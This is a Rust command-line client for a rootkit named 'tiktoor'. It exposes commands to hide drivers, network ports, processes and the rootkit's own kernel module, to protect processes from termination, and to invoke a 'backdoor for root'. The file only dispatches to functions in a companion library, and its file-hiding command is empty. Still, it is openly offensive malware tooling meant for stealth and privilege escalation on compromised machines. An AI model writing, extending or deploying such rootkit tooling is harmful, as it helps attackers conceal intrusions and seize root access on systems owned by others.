use std::ffi::CString;
use structopt::StructOpt;

/// A CLI tool for communicating with tiktoor
#[derive(StructOpt)]
enum Cli {
    /// Hide driver
    DriverHiding {
        /// driver name
        #[structopt(short, long)]
        name: String,
    },
    /// Hide file
    FileHiding,
    /// Hide port
    PortHiding {
        #[structopt(subcommand)]
        transmission_type: PortHidingTransmissionType,
        #[structopt(short, long)]
        port: u16,
    },
    /// Hide process
    ProcessHiding {
        /// Process pid
        #[structopt(short, long)]
        pid: u32,
    },
    /// Protect process
    ProcessProtection {
        /// Process pid
        #[structopt(short, long)]
        pid: u32,
    },
    /// Hide tiktoor module
    ModuleHiding,
    /// Unhide tiktoor module
    ModuleUnhiding,
    /// Backdoor for root
    BackdoorForRoot,
}

/// Port hiding transmission type
#[repr(u8)]
#[derive(StructOpt)]
enum PortHidingTransmissionType {
    /// TCP4
    Tcp4 = 0x0,
    /// TCP6
    Tcp6 = 0x1,
    /// UDP4
    Udp4 = 0x2,
    /// UDP6
    Udp6 = 0x3,
}

fn main() {
    let cli = Cli::from_args();

    match cli {
        Cli::DriverHiding { name } => {
            if let Ok(name) = CString::new(name) {
                tiktoor_client::hide_driver(&name)
            }
        }
        Cli::FileHiding => {}
        Cli::PortHiding {
            transmission_type,
            port,
        } => tiktoor_client::hide_port(transmission_type as u8, port),
        Cli::ProcessHiding { pid } => tiktoor_client::hide_process(pid),
        Cli::ProcessProtection { pid } => tiktoor_client::protect_process(pid),
        Cli::ModuleHiding => tiktoor_client::hide_module(),
        Cli::ModuleUnhiding => tiktoor_client::unhide_module(),
        Cli::BackdoorForRoot => tiktoor_client::backdoor_for_root(),
    }
}
